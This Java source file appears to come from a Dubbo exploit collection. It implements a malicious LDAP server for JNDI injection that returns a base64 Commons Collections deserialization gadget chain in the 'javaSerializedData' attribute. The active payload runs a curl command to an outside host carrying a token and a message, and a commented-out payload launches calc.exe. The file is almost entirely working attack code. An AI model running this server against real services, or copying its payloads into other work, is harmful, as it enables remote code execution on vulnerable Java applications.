package com.threedr3am.exp.dubbo.jndiserver;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.FileNotFoundException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LDAPServer
{
    private static final String LDAP_BASE = "dc=example,dc=com";
    public static void main(String[] agv)
    {
        int port = 1389;
        String args[] = {"http://localhost:8000/#Exploit"};
        if ((args.length < 1) || (args[0].indexOf('#') < 0))
        {
            System.err.println(LDAPServer.class.getSimpleName() + " <codebase_url#classname> [<port>]");
            System.exit(-1);
        }
        else if (args.length > 1)
        {
            port = Integer.parseInt(args[1]);
        }
        try
        {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(new String[] { "dc=example,dc=com" });
            config.setListenerConfigs(
                    new InMemoryListenerConfig[] {
                            new InMemoryListenerConfig(
                                    "listen",
                                    InetAddress.getByName("0.0.0.0"), port,
                                    ServerSocketFactory.getDefault(),
                                    SocketFactory.getDefault(),
                                    (SSLSocketFactory)SSLSocketFactory.getDefault()) }
            );
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[0])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
    private static class OperationInterceptor
            extends InMemoryOperationInterceptor
    {
        private URL codebase;
        public OperationInterceptor(URL cb)
        {
            this.codebase = cb;
        }
        public void processSearchResult(InMemoryInterceptedSearchResult result)
        {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try
            {
                sendResult(result, base, e);
            }
            catch (Exception e1)
            {
                e1.printStackTrace();
            }
        }
        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e)
                throws LDAPException, MalformedURLException, FileNotFoundException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos);
            }
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());





            //jjj.toString()
            //gadget 内容放到 javaSerializeData中
            try {
//                e.addAttribute("javaSerializedData",Base64.decode("rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofa" +
//                        "q2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlv" +
//                        "btD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAV" +
//                        "TGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5n" +
//                        "O1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVz" +
//                        "c2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5T" +
//                        "dGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFj" +
//                        "ZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAI" +
//                        "ZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fk" +
//                        "cy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2Jq" +
//                        "ZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJh" +
//                        "dGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xs" +
//                        "ZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0/A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51" +
//                        "dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJsZUNvbGxlY3Rpb24ZQgCAy173HgIAAUwAAWN0ABZM" +
//                        "amF2YS91dGlsL0NvbGxlY3Rpb247eHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwAB" +
//                        "SQAEc2l6ZXhwAAAAAHcEAAAAAHhxAH4AGnhzcgA0b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rp" +
//                        "b25zLmtleXZhbHVlLlRpZWRNYXBFbnRyeYqt0ps5wR/bAgACTAADa2V5cQB+AAFMAANtYXB0AA9M" +
//                        "amF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMu" +
//                        "bWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2Nv" +
//                        "bGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9u" +
//                        "cy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0" +
//                        "AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9y" +
//                        "Zy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAA" +
//                        "BXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFu" +
//                        "c2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAF4cHZyABFqYXZhLmxhbmcuUnVudGlt" +
//                        "ZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3Jz" +
//                        "Lkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmpl" +
//                        "Y3Q7TAALaU1ldGhvZE5hbWVxAH4ABVsAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7" +
//                        "eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVy" +
//                        "ABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AMgAA" +
//                        "AAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ADJzcQB+ACt1cQB+AC8AAAAC" +
//                        "cHVxAH4ALwAAAAB0AAZpbnZva2V1cQB+ADIAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAA" +
//                        "AAAAAHhwdnEAfgAvc3EAfgArdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAA" +
//                        "AXQACGNhbGMuZXhldAAEZXhlY3VxAH4AMgAAAAFxAH4AN3NxAH4AJ3NyABFqYXZhLmxhbmcuSW50" +
//                        "ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAA" +
//                        "AAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNo" +
//                        "b2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eA=="));
                e.addAttribute("javaSerializedData",Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAA" +
                        "AAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUu" +
                        "VGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVj" +
                        "dDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hl" +
                        "LmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2Zh" +
                        "Y3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9y" +
                        "bWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9y" +
                        "cy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0" +
                        "AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4" +
                        "cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1l" +
                        "cju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVj" +
                        "dGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJ" +
                        "aUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAA" +
                        "eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLklu" +
                        "dm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFu" +
                        "Zy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtp" +
                        "UGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5n" +
                        "Lk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZh" +
                        "LmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsA" +
                        "AAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgAT" +
                        "dXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZh" +
                        "LmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEu" +
                        "bGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AQtjdXJsIGh0dHBzOi8vYXBp" +
                        "Lm9zc2VjLmNuL3YxL3NlbmQ/dG9rZW49NDNiYWJiYzI1MDM0N2Y5MDg3YThmYjBi" +
                        "OGUyNzZhOTM3M2VmNTY3YiZ0b3BpYz1XQUYlRTUlOTElOEElRTglQUQlQTYmbWVz" +
                        "c2FnZT0lRTYlOUQlQTUlRTYlQkElOTAxLjEuMS4xJUU3JTlBJTg0SVAlRTYlQUQl" +
                        "QTMlRTUlOUMlQTglRTUlQUYlQjklRTclQkQlOTElRTclQUIlOTlleGFtcGxlLmNv" +
                        "bSVFOCVCRiU5QiVFOCVBMSU4Q3NxbCVFNiVCMyVBOCVFNSU4NSVBNSVFNiU5NCVC" +
                        "QiVFNSU4NyVCQiF0AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEu" +
                        "bGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVt" +
                        "YmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg" +
                        "0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAA" +
                        "AHh4eA=="));
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (ParseException ex) {
                ex.printStackTrace();
            }
        }


    }
}
